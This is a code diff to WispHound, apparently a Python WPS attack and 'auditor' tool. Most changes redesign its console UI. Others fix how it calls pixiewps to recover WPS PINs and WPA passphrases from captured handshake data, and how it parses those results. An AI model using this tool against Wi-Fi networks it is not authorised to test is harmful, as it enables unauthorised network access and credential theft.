@@ -1,22 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-WispHound 2.1.3 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.
+WispHound 2.2.0 — WPS reconnaissance, Pixie Dust prioritization & multi-backend auditor.
 
-Changes vs 2.1.2:
-  * [FIX] Reports directory is now resolved to a *writable* location
-    (~/.WispHound/reports → script-dir/reports → /tmp/wisphound-reports)
-    instead of blindly using script-dir/reports. This fixes
-    "cannot store on reports" on read-only installs (e.g. /usr/bin).
-  * [FIX] All save paths (__saveResult, _handle_backend_result) now:
-      - create the directory with error handling,
-      - catch OSError and print an explicit error,
-      - never silently swallow write failures.
-  * [FIX] WiFiScanner reads stored.csv from the *same* writable reports
-    dir that saves write to (was reading script-dir/reports).
-  * [FIX] auto_exploit() and __main__ use pick_reports_dir() so backend
-    credentials and internal-backend credentials land in the same place.
-  * [FIX] __savePin() wrapped in OSError handling.
+Changes vs 2.1.3:
+  * [FIX] Pixiewps argument handling: removed invalid '--timeout' flag from
+    PixiewpsData.get_pixie_args(); pixiewps timeout is now cleanly enforced via
+    subprocess.run(timeout=...) avoiding execution failure on 6/6 captured data.
+  * [FIX] Pixiewps --force flag compatibility: added automatic detection and graceful
+    fallback retry without '--force' if pixiewps returns "unrecognized option".
+  * [FIX] Pixiewps error detection: added detection of option errors and non-zero
+    return codes with descriptive diagnostic messages instead of silent timeout failures.
+  * [UI] Complete layout & UI redesign:
+      - Modern rounded border tables (╭─┬─╮) with auto-align and clean margins.
+      - Sleek, color-coded status badges and hierarchical indenticators (├─, └─) for
+        protocol handshake messages and sub-steps.
+      - Signal strength color gradients (dBm) across scanner and attack traces.
+      - Polished ASCII banner with metadata header and modernized section dividers.
 """
 import argparse
 import codecs
@@ -79,6 +79,7 @@ class UI:
     BG_BLUE = '\033[44m'
     BG_MAGENTA = '\033[45m'
     BG_CYAN = '\033[46m'
+    BG_GREY = '\033[100m'
 
     # -- TTY detection -----------------------------------------------------
     _enabled = None
@@ -115,6 +116,66 @@ class UI:
     @classmethod
     def head(cls, text):    return cls.c(text, cls.BOLD, cls.CYAN)
 
+    # -- signal power formatter --------------------------------------------
+    @classmethod
+    def pwr(cls, val):
+        """Format an RSSI power level (e.g. -54) with signal color and unit."""
+        if val is None or val == '' or val == '?':
+            return cls.muted('[?? dBm]')
+        s = str(val).strip()
+        num_m = re.search(r'(-?\d+)', s)
+        if not num_m:
+            return cls.muted(f'[{s}]')
+        try:
+            n = int(num_m.group(1))
+            formatted = f'{n} dBm'
+            if n >= -65:
+                return cls.c(f'[{formatted}]', cls.BOLD, cls.GREEN)
+            elif n >= -75:
+                return cls.c(f'[{formatted}]', cls.BOLD, cls.YELLOW)
+            else:
+                return cls.c(f'[{formatted}]', cls.BOLD, cls.RED)
+        except (ValueError, TypeError):
+            return cls.muted(f'[{s}]')
+
+    # -- indicators & tree indenticator ------------------------------------
+    @classmethod
+    def indicator(cls, kind):
+        """Return a modern styled bracket indicator for console logs."""
+        k = str(kind).strip().lower()
+        mapping = {
+            'ok':    cls.c('[+]', cls.BOLD, cls.GREEN),
+            '+':     cls.c('[+]', cls.BOLD, cls.GREEN),
+            'err':   cls.c('[-]', cls.BOLD, cls.RED),
+            '-':     cls.c('[-]', cls.BOLD, cls.RED),
+            'warn':  cls.c('[!]', cls.BOLD, cls.YELLOW),
+            '!':     cls.c('[!]', cls.BOLD, cls.YELLOW),
+            'info':  cls.c('[*]', cls.BOLD, cls.CYAN),
+            '*':     cls.c('[*]', cls.BOLD, cls.CYAN),
+            'pixie': cls.c('[P]', cls.BOLD, cls.MAGENTA),
+            'p':     cls.c('[P]', cls.BOLD, cls.MAGENTA),
+            'run':   cls.c('[»]', cls.BOLD, cls.MAGENTA),
+            'scan':  cls.c('[~]', cls.BOLD, cls.BLUE),
+            'dbg':   cls.c('[#]', cls.BOLD, cls.GREY),
+            '#':     cls.c('[#]', cls.BOLD, cls.WHITE),
+            'star':  cls.c('[★]', cls.BOLD, cls.YELLOW),
+            'dot':   cls.c('[•]', cls.BOLD, cls.WHITE),
+        }
+        return mapping.get(k, cls.c(f'[{kind}]', cls.BOLD, cls.CYAN))
+
+    @classmethod
+    def indenticator(cls, level=0, is_last=False):
+        """Return tree guide indentation prefix for structured visual hierarchy."""
+        if level <= 0:
+            return ''
+        branch = '└─ ' if is_last else '├─ '
+        if level == 1:
+            return cls.muted('  ' + branch)
+        elif level == 2:
+            return cls.muted('  │  ' + branch)
+        guide = '  │' * (level - 1) + ('  └─ ' if is_last else '  ├─ ')
+        return cls.muted(guide)
+
     # -- badges ------------------------------------------------------------
     @classmethod
     def badge(cls, label, fg=None, bg=None):
@@ -143,46 +204,47 @@ class UI:
     # -- message helpers ---------------------------------------------------
     @classmethod
     def tag(cls, kind):
-        tags = {
-            'ok':   (cls.badge_ok('OK'),),
-            'err':  (cls.badge_err('ERR'),),
-            'warn': (cls.badge_warn('WARN'),),
-            'info': (cls.badge_info('INFO'),),
-            'dbg':  (cls.badge_grey('DBG'),),
-            'scan': (cls.badge_cyan('SCAN'),),
-            'run':  (cls.badge_magenta('RUN'),),
-        }
-        return tags.get(kind, ('',))[0]
+        return cls.indicator(kind)
 
     @classmethod
-    def msg(cls, kind, text):
-        return f'{cls.tag(kind)} {text}'
+    def msg(cls, kind, text, indent=0, is_last=False):
+        prefix = cls.indenticator(indent, is_last=is_last)
+        return f'{prefix}{cls.indicator(kind)} {text}'
 
     # -- banner ------------------------------------------------------------
     @classmethod
     def banner(cls, subtitle=''):
         art = r"""
- __      __.__               ___ ___                    .___
-/  \    /  \__| ____________ /   |   \  ____  __ __  __| _/
-\   \/\/   /  |/  ___/\____ \/    ~    \/  _ \|  |  \/ __ |
- \        /|  |\___ \ /  |_> >    Y    (  <_> )  |  / /_/ |
-  \__/\  / |__/____  >|   __/ \___|_  / \____/|____/\____ |
-       \/          \/ |__|         \/                   \/
-"""
+ ╭──────────────────────────────────────────────────────────────────╮
+ │    __      __.__               ___ ___                    .___   │
+ │   /  \    /  \__| ____________ /   |   \  ____  __ __  __| _/   │
+ │   \   \/\/   /  |/  ___/\____ \/    ~    \/  _ \|  |  \/ __ |   │
+ │    \        /|  |\___ \ /  |_> >    Y    (  <_> )  |  / /_/ |   │
+ │     \__/\  / |__/____  >|   __/ \___|_  / \____/|____/\____ |   │
+ │          \/          \/ |__|         \/                   \/    │
+ ╰──────────────────────────────────────────────────────────────────╯"""
         lines = art.strip('\n').splitlines()
         out = []
         for ln in lines:
             out.append(cls.c(ln, cls.BOLD, cls.CYAN))
         out.append('')
-        title = f'WispHound {VERSION}'
-        out.append('  ' + cls.c(title, cls.BOLD, cls.WHITE)
-                   + cls.muted('  —  ' + (subtitle or 'WPS reconnaissance & Pixie Dust auditor')))
+        title_line = (f"  {cls.c('WispHound', cls.BOLD, cls.WHITE)} "
+                      f"{cls.c(f'v{VERSION}', cls.BOLD, cls.CYAN)} "
+                      f"{cls.muted('—')} "
+                      f"{cls.c(subtitle or 'WPS Reconnaissance, Pixie Dust Prioritizer & Multi-Backend Auditor', cls.WHITE)}")
+        meta_line = (f"  {cls.muted('Engines:')} {cls.c('Internal (wpa_supplicant)', cls.GREEN)} "
+                     f"{cls.muted('•')} {cls.c('Reaver', cls.YELLOW)} "
+                     f"{cls.muted('•')} {cls.c('Bully', cls.MAGENTA)} "
+                     f"{cls.muted('│')} {cls.muted('Platform:')} {cls.c('Linux 802.11', cls.CYAN)}")
+        out.append(title_line)
+        out.append(meta_line)
+        out.append(cls.muted('  ' + '─' * 66))
         return '\n'.join(out)
 
     # -- tables ------------------------------------------------------------
     @classmethod
     def table(cls, headers, rows, aligns=None, max_widths=None, title=None):
-        """Render a Unicode box-drawing table.
+        """Render a modern Unicode rounded box-drawing table.
 
         headers: list[str]
         rows:    list[list[str]]  (may contain pre-colored strings)
@@ -190,7 +252,6 @@ class UI:
         max_widths: list[int] truncation limits (visible width)
         """
         def vlen(s):
-            # strip ANSI
             plain = re.sub(r'\033\[[0-9;]*m', '', str(s))
             return wcwidth.wcswidth(plain)
 
@@ -227,8 +288,8 @@ class UI:
                 return ' ' * left + s + ' ' * (gap - left)
             return s + ' ' * gap
 
-        # box chars
-        TL, TR, BL, BR = '┌', '┐', '└', '┘'
+        # Modern rounded box chars
+        TL, TR, BL, BR = '╭', '╮', '╰', '╯'
         H, V = '─', '│'
         TM, BM, LM, RM, MM = '┬', '┴', '├', '┤', '┼'
 
@@ -241,9 +302,9 @@ class UI:
 
         out = []
         if title:
-            out.append(cls.head(title))
+            out.append('  ' + cls.c('◆ ', cls.CYAN) + cls.head(title))
         out.append(cls.muted(rule(TL, TM, TR)))
-        out.append(cls.head(line([cls.hi(h) for h in headers])))
+        out.append(line([cls.c(h, cls.BOLD, cls.CYAN) for h in headers]))
         out.append(cls.muted(rule(LM, MM, RM)))
         for r in rows:
             out.append(line(r))
@@ -314,8 +375,9 @@ class UI:
 
     @classmethod
     def section(cls, title):
-        line = '─' * max(10, min(60, len(title) + 4))
-        return f'\n{cls.head(title)}\n{cls.muted(line)}'
+        prefix = cls.c('◆', cls.BOLD, cls.CYAN)
+        line = cls.muted('─' * max(10, min(50, 60 - len(title))))
+        return f'\n  {prefix} {cls.head(title)} {line}'
 
 
 def vlen_safe(s):
@@ -326,7 +388,7 @@ def vlen_safe(s):
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-VERSION = '2.1.3'
+VERSION = '2.2.0'
 
 
 # [FIX] Resolve a writable reports directory once, and cache it.
@@ -966,8 +1028,8 @@ class PixiewpsData:
         'e_s1':    re.compile(r'E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
         'e_s2':    re.compile(r'E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
     }
-    _RE_PIXIE_PIN = re.compile(r'\[#\]\s*WPS\s+pin\s*[:=]\s*(\d+)', re.I)
-    _RE_PIXIE_PSK = re.compile(r'\[#\]\s*WPA\s+PSK\s*[:=]\s*(.+)', re.I)
+    _RE_PIXIE_PIN = re.compile(r'\[[+#]\]\s*WPS\s+pin\s*[:=]\s*(\d+)', re.I)
+    _RE_PIXIE_PSK = re.compile(r'\[[+#]\]\s*WPA\s+PSK\s*[:=]\s*(.+)', re.I)
 
     def __init__(self):
         self.pke = ''
@@ -1039,24 +1101,28 @@ class PixiewpsData:
             args.extend(['--r-s2', self.r_s2])
         if full_range:
             args.append('--force')
-        if timeout is not None:
-            args.extend(['--timeout', str(int(timeout))])
+        # Note: --timeout is deliberately omitted because pixiewps CLI has no
+        # such flag; process execution timeouts are handled by subprocess.run().
         return args
 
     def get_pixie_cmd(self, full_range=False, timeout=None):
-        return ' '.join(self.get_pixie_args(full_range, timeout))
+        return ' '.join(self.get_pixie_args(full_range))
 
     def run_pixiewps(self, full_range=False, timeout=None, verbose=False):
         if not shutil.which('pixiewps'):
             print(UI.msg('err', 'pixiewps not found in PATH'))
             return None, None
-        args = self.get_pixie_args(full_range, timeout)
+        args = self.get_pixie_args(full_range)
+        effective_timeout = timeout or 300
         try:
             proc = subprocess.run(
                 args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                encoding='utf-8', errors='replace', timeout=timeout or 300)
+                encoding='utf-8', errors='replace', timeout=effective_timeout)
         except subprocess.TimeoutExpired:
-            print(UI.msg('err', 'pixiewps timed out'))
+            print(UI.msg('err', f'pixiewps timed out after {effective_timeout}s'))
+            return None, None
+        except FileNotFoundError:
+            print(UI.msg('err', 'pixiewps binary not found in PATH'))
             return None, None
         except Exception as e:
             print(UI.msg('err', f'pixiewps execution error: {e}'))
@@ -1065,6 +1131,16 @@ class PixiewpsData:
         if verbose:
             for line in output.splitlines():
                 print(f'  {UI.muted("[pixiewps]")} {line}')
+
+        out_lower = output.lower()
+        if 'unrecognized option' in out_lower or 'invalid option' in out_lower:
+            if full_range:
+                print(UI.msg('warn', 'pixiewps rejected --force ("unrecognized option"); retrying without --force…'))
+                return self.run_pixiewps(full_range=False, timeout=timeout, verbose=verbose)
+            err_line = next((l.strip() for l in output.splitlines() if 'unrecognized' in l.lower() or 'invalid' in l.lower()), 'unrecognized option')
+            print(UI.msg('err', f'pixiewps option error: {err_line}'))
+            return None, None
+
         pin = None
         psk = None
         for line in output.splitlines():
@@ -1074,6 +1150,11 @@ class PixiewpsData:
             m = self._RE_PIXIE_PSK.search(line)
             if m:
                 psk = m.group(1).strip()
+
+        if pin is None and proc.returncode != 0 and not ('failed' in out_lower or 'not found' in out_lower or 'pin' in out_lower):
+            first_err = output.strip().splitlines()[-1] if output.strip() else f'exit code {proc.returncode}'
+            print(UI.msg('err', f'pixiewps exited with error: {first_err}'))
+
         return pin, psk
 
     def _parse_output(self, text, patterns):
@@ -1769,55 +1850,55 @@ class Companion:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
                 self.connection_status.last_m_message = n
                 self.__print_with_indicators(
-                    '*', f'Sending WPS Message M{n}…')
+                    '*', f'Sending WPS Message M{n}…', indent=1)
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
                 self.__print_with_indicators(
-                    '*', f'Received WPS Message M{n}')
+                    '*', f'Received WPS Message M{n}', indent=1)
                 if n == 5:
-                    print(UI.msg('ok', 'The first half of the PIN is valid'))
+                    print(UI.msg('ok', 'The first half of the PIN is valid', indent=2))
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
                 self.connection_status.nack_count += 1
-                self.__print_with_indicators('*', 'Received WSC NACK')
-                print(UI.msg('err', 'Wrong PIN code'))
+                self.__print_with_indicators('!', 'Received WSC NACK', indent=1)
+                print(UI.msg('err', 'Wrong PIN code', indent=2))
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.e_nonce = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] E-Nonce: {self.pixie_creds.e_nonce}'))
+                    print(UI.msg('pixie', f'E-Nonce: {self.pixie_creds.e_nonce}', indent=2))
             elif 'Registrar Nonce' in line and 'hexdump' in line:
                 self.pixie_creds.r_nonce = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] R-Nonce: {self.pixie_creds.r_nonce}'))
+                    print(UI.msg('pixie', f'R-Nonce: {self.pixie_creds.r_nonce}', indent=2))
             elif 'DH own Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pkr = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] PKR: {self.pixie_creds.pkr}'))
+                    print(UI.msg('pixie', f'PKR: {self.pixie_creds.pkr}', indent=2))
             elif 'DH peer Public Key' in line and 'hexdump' in line:
                 self.pixie_creds.pke = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] PKE: {self.pixie_creds.pke}'))
+                    print(UI.msg('pixie', f'PKE: {self.pixie_creds.pke}', indent=2))
             elif 'AuthKey' in line and 'hexdump' in line:
                 self.pixie_creds.authkey = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] AuthKey: {self.pixie_creds.authkey}'))
+                    print(UI.msg('pixie', f'AuthKey: {self.pixie_creds.authkey}', indent=2))
             elif 'E-Hash1' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash1 = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] E-Hash1: {self.pixie_creds.e_hash1}'))
+                    print(UI.msg('pixie', f'E-Hash1: {self.pixie_creds.e_hash1}', indent=2))
             elif 'E-Hash2' in line and 'hexdump' in line:
                 self.pixie_creds.e_hash2 = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] E-Hash2: {self.pixie_creds.e_hash2}'))
+                    print(UI.msg('pixie', f'E-Hash2: {self.pixie_creds.e_hash2}', indent=2))
             elif 'E-S1' in line and 'hexdump' in line:
                 self.pixie_creds.e_s1 = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] E-S1: {self.pixie_creds.e_s1}'))
+                    print(UI.msg('pixie', f'E-S1: {self.pixie_creds.e_s1}', indent=2))
             elif 'E-S2' in line and 'hexdump' in line:
                 self.pixie_creds.e_s2 = get_hex(line)
                 if pixiemode:
-                    print(UI.muted(f'[P] E-S2: {self.pixie_creds.e_s2}'))
+                    print(UI.msg('pixie', f'E-S2: {self.pixie_creds.e_s2}', indent=2))
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(
@@ -1825,48 +1906,48 @@ class Companion:
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
-                self.__print_with_indicators('*', 'Scanning…')
+                self.__print_with_indicators('*', 'Scanning…', indent=0)
         elif 'WPS-FAIL' in line and self.connection_status.status != '':
             self.connection_status.status = 'WPS_FAIL'
-            print(UI.msg('err', 'wpa_supplicant returned WPS-FAIL'))
+            print(UI.msg('err', 'wpa_supplicant returned WPS-FAIL', indent=1))
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = self._extract_essid(line)
-            self.__print_with_indicators('*', 'Authenticating…')
+            self.__print_with_indicators('*', 'Authenticating…', indent=0)
         elif 'Authentication response' in line:
-            self.__print_with_indicators('*', 'Authenticated')
+            self.__print_with_indicators('+', 'Authenticated', indent=0)
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = self._extract_essid(line)
-            self.__print_with_indicators('*', 'Associating with AP…')
+            self.__print_with_indicators('*', 'Associating with AP…', indent=0)
         elif 'Associated with' in line and self.interface in line:
             b = line.split()[-1].upper()
             if self.connection_status.essid:
                 self.__print_with_indicators(
                     '+', f'Associated with {b} '
-                         f'(ESSID: {self.connection_status.essid})')
+                         f'(ESSID: {self.connection_status.essid})', indent=0)
             else:
-                self.__print_with_indicators('+', f'Associated with {b}')
+                self.__print_with_indicators('+', f'Associated with {b}', indent=0)
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            self.__print_with_indicators('*', 'Sending EAPOL Start…')
+            self.__print_with_indicators('*', 'Sending EAPOL Start…', indent=1)
         elif 'EAP entering state IDENTITY' in line:
-            self.__print_with_indicators('*', 'Received Identity Request')
+            self.__print_with_indicators('*', 'Received Identity Request', indent=1)
         elif 'using real identity' in line:
-            self.__print_with_indicators('*', 'Sending Identity Response…')
+            self.__print_with_indicators('*', 'Sending Identity Response…', indent=1)
         elif bssid and bssid in line.lower() and 'level=' in line:
             self.lastPwr = line.split('level=')[1].split(' ')[0]
             if 'noise=' in line:
                 noise = line.split('noise=')[1].split(' ')[0]
-                print(UI.msg('info', f'Current signal: {self.lastPwr}, noise: {noise}'))
+                print(UI.msg('info', f'Current signal: {UI.pwr(self.lastPwr)}, noise: {noise}', indent=1))
             else:
-                print(UI.msg('info', f'Current signal: {self.lastPwr}'))
+                print(UI.msg('info', f'Current signal: {UI.pwr(self.lastPwr)}', indent=1))
         elif pbc_mode and ('selected BSS ' in line):
             b = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = b
-            print(UI.msg('info', f'Selected AP: {b}'))
+            print(UI.msg('info', f'Selected AP: {b}', indent=0))
 
         return True
 
@@ -1880,12 +1961,11 @@ class Companion:
             return ''
 
     def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
-        self.__print_with_indicators('*', 'Running Pixiewps…')
+        self.__print_with_indicators('*', 'Running Pixiewps…', indent=0)
         self.__print_with_indicators(
-            'P', self.pixie_creds.status_line())
+            'P', self.pixie_creds.status_line(), indent=1, is_last=True)
         try:
-            argv = self.pixie_creds.get_pixie_args(
-                full_range, timeout=self.pixiewps_timeout)
+            argv = self.pixie_creds.get_pixie_args(full_range)
         except ValueError as e:
             print(UI.msg('err', f'Pixiewps data validation failed: {e}'))
             return False
@@ -1907,12 +1987,24 @@ class Companion:
         except FileNotFoundError:
             print(UI.msg('err', 'pixiewps binary not found in PATH'))
             return False
+        except Exception as e:
+            print(UI.msg('err', f'pixiewps execution error: {e}'))
+            return False
 
         out = r.stdout or ''
         print(out)
         self._emit_json('pixiewps_output', rc=r.returncode, out=out)
 
-        m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
+        out_lower = out.lower()
+        if 'unrecognized option' in out_lower or 'invalid option' in out_lower:
+            if full_range:
+                print(UI.msg('warn', 'pixiewps rejected --force ("unrecognized option"); retrying without --force…'))
+                return self.__runPixiewps(showcmd, full_range=False, _retry=False)
+            err_line = next((l.strip() for l in out.splitlines() if 'unrecognized' in l.lower() or 'invalid' in l.lower()), 'unrecognized option')
+            print(UI.msg('err', f'pixiewps option error: {err_line}'))
+            return False
+
+        m = re.search(r"\[[+#]\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out, re.I)
         if m:
             pin = m.group(1).strip()
             if pin == '<empty>':
@@ -1927,9 +2019,13 @@ class Companion:
                 return full
 
         if _retry and not full_range and (
-                'force' in out.lower() or 'full range' in out.lower()):
+                'force' in out_lower or 'full range' in out_lower):
             print(UI.msg('info', 'Retrying with --force (full range)…'))
             return self.__runPixiewps(showcmd, full_range=True, _retry=False)
+
+        if r.returncode != 0 and not ('failed' in out_lower or 'not found' in out_lower or 'pin:' in out_lower):
+            first_err = out.strip().splitlines()[-1] if out.strip() else f'exit code {r.returncode}'
+            print(UI.msg('err', f'pixiewps exited with error: {first_err}'))
 
         return False
 
@@ -2262,10 +2358,11 @@ class Companion:
             if loop:
                 raise
 
-    def __print_with_indicators(self, level, msg):
-        tag = UI.muted(f'[{level}]')
-        pwr = UI.muted(f'[{self.lastPwr}]')
-        print(f'{tag} {pwr} {msg}')
+    def __print_with_indicators(self, level, msg, indent=0, is_last=False):
+        tag = UI.indicator(level)
+        pwr = UI.pwr(self.lastPwr)
+        prefix = UI.indenticator(indent, is_last=is_last)
+        print(f'{prefix}{tag} {pwr} {msg}')
 
 
 # ---------------------------------------------------------------------------
@@ -2487,14 +2584,13 @@ class WiFiScanner:
 
         # Legend
         legend = '  '.join([
-            UI.ok('● vulnerable'),
-            UI.err('● WPS locked'),
-            UI.warn('● already stored'),
-            UI.info('● Pixie-vulnerable'),
-            UI.muted('● no WPS'),
+            f"{UI.indicator('+')} vulnerable",
+            f"{UI.indicator('-')} WPS locked",
+            f"{UI.indicator('!')} already stored",
+            f"{UI.indicator('P')} Pixie-vulnerable",
+            f"{UI.muted('[·]')} no WPS",
         ])
-        print(UI.muted('Legend: ') + legend)
-        print()
+        print(f"\n  {UI.c('Legend:', UI.BOLD, UI.WHITE)}  {legend}\n")
 
         # Build table rows
         rows = []
@@ -2507,7 +2603,15 @@ class WiFiScanner:
             dev = truncateStr(net['Device name'], 22)
             ch = str(net.get('Channel', ''))
             wps_flag = UI.ok('yes') if net.get('WPS') else UI.muted('no')
-            level = str(net['Level'])
+            lvl = net.get('Level', -100)
+            level = f"{lvl} dBm"
+            if lvl >= -65:
+                pwr_cell = UI.ok(level)
+            elif lvl >= -75:
+                pwr_cell = UI.warn(level)
+            else:
+                pwr_cell = UI.err(level)
+
             # Determine row colorisation
             if not net.get('WPS'):
                 row = [UI.muted(str(n)), UI.muted(net['BSSID']),
@@ -2515,28 +2619,28 @@ class WiFiScanner:
                        UI.muted(level), UI.muted(ch), wps_flag,
                        UI.muted(dev), UI.muted(model)]
             elif net.get('Pixie vulnerable'):
-                row = [UI.info(f'{n})'), UI.info(net['BSSID']),
+                row = [UI.indicator('P') + f' {n}', UI.info(net['BSSID']),
                        UI.info(essid), UI.info(net['Security type']),
-                       UI.info(level), UI.info(ch), wps_flag,
+                       pwr_cell, UI.info(ch), wps_flag,
                        UI.info(dev), UI.info(model)]
             elif (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
-                row = [UI.warn(f'{n})'), UI.warn(net['BSSID']),
+                row = [UI.indicator('!') + f' {n}', UI.warn(net['BSSID']),
                        UI.warn(essid), UI.warn(net['Security type']),
-                       UI.warn(level), UI.warn(ch), wps_flag,
+                       pwr_cell, UI.warn(ch), wps_flag,
                        UI.warn(dev), UI.warn(model)]
             elif net['WPS locked']:
-                row = [UI.err(f'{n})'), UI.err(net['BSSID']),
+                row = [UI.indicator('-') + f' {n}', UI.err(net['BSSID']),
                        UI.err(essid), UI.err(net['Security type']),
-                       UI.err(level), UI.err(ch), wps_flag,
+                       pwr_cell, UI.err(ch), UI.err('lock'),
                        UI.err(dev), UI.err(model)]
             elif self.vuln_list and model in self.vuln_list:
-                row = [UI.ok(f'{n})'), UI.ok(net['BSSID']),
+                row = [UI.indicator('+') + f' {n}', UI.ok(net['BSSID']),
                        UI.ok(essid), UI.ok(net['Security type']),
-                       UI.ok(level), UI.ok(ch), wps_flag,
+                       pwr_cell, UI.ok(ch), wps_flag,
                        UI.ok(dev), UI.ok(model)]
             else:
                 row = [f'{n})', net['BSSID'], essid,
-                       net['Security type'], level, ch, wps_flag, dev, model]
+                       net['Security type'], pwr_cell, ch, wps_flag, dev, model]
             rows.append(row)
 
         print(UI.table(
@@ -2544,8 +2648,8 @@ class WiFiScanner:
              'WSC device name', 'WSC model'],
             rows,
             aligns=['r', 'l', 'l', 'l', 'r', 'r', 'c', 'l', 'l'],
-            max_widths=[4, 17, 24, 10, 5, 4, 5, 22, 30],
-            title=f'Networks list — all bands ({len(rows)} APs)'))
+            max_widths=[5, 17, 24, 10, 9, 4, 6, 22, 30],
+            title=f'Discovered Networks — all bands ({len(rows)} APs)'))
 
         return network_list
 
